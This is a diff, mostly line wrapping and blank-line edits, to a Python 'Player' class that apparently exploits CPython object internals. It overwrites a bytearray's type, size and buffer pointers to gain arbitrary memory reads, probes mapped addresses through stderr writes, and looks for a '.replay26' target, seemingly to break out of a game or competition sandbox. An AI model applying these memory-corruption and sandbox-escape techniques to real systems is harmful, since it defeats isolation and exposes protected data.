@@ -1,6 +1,7 @@
 import io
 import struct
 import sys
+
 from cambc import Controller
 
 TARGET = b".replay26"
@@ -16,7 +17,6 @@ _OB_START = 40
 
 
 class Player:
-
     def __init__(self) -> None:
         self._addr = PAGE
         self._log: str = ""
@@ -33,8 +33,7 @@ class Player:
         # Wrap fd=2 (stderr) without opening a path — always available.
         # Write 1 byte as a probe: EFAULT -> OSError (unmapped), success -> mapped.
         # Actual data is read via obj[] slice, no pipe/drain needed.
-        probe_f = io.FileIO(2, "wb", closefd=False)
-
+        io.FileIO(2, "wb", closefd=False)
 
         sentinel = object()
         xor = int(repr(sentinel).split("0x")[-1].rstrip(">"), 16) ^ id(sentinel)
@@ -78,7 +77,9 @@ class Player:
         assert type(obj) is bytearray
 
         obj_addr = real_id(obj)
-        obj[obj_addr + 8 : obj_addr + 16] = real_id(bytearray).to_bytes(8, sys.byteorder)
+        obj[obj_addr + 8 : obj_addr + 16] = real_id(bytearray).to_bytes(
+            8, sys.byteorder
+        )
 
         idv = real_id(Victim)
         rc = int.from_bytes(obj[idv : idv + 8], sys.byteorder)
@@ -88,14 +89,21 @@ class Player:
         probe_addr = real_id(probe)
 
         import os as _os
+
         fd_r, fd_w = _os.pipe()
         fw = io.FileIO(fd_w, "wb", closefd=True)
         fr = io.FileIO(fd_r, "rb", closefd=True)
 
         def redirect(target: int, size: int) -> None:
-            obj[probe_addr + _OB_SIZE  : probe_addr + _OB_SIZE  + 8] = size.to_bytes(8, sys.byteorder)
-            obj[probe_addr + _OB_ALLOC : probe_addr + _OB_ALLOC + 8] = size.to_bytes(8, sys.byteorder)
-            obj[probe_addr + _OB_BYTES : probe_addr + _OB_START + 8] = target.to_bytes(8, sys.byteorder) * 2
+            obj[probe_addr + _OB_SIZE : probe_addr + _OB_SIZE + 8] = size.to_bytes(
+                8, sys.byteorder
+            )
+            obj[probe_addr + _OB_ALLOC : probe_addr + _OB_ALLOC + 8] = size.to_bytes(
+                8, sys.byteorder
+            )
+            obj[probe_addr + _OB_BYTES : probe_addr + _OB_START + 8] = (
+                target.to_bytes(8, sys.byteorder) * 2
+            )
 
         def read_chunk(addr: int, size: int) -> bytes | None:
             redirect(addr, size)
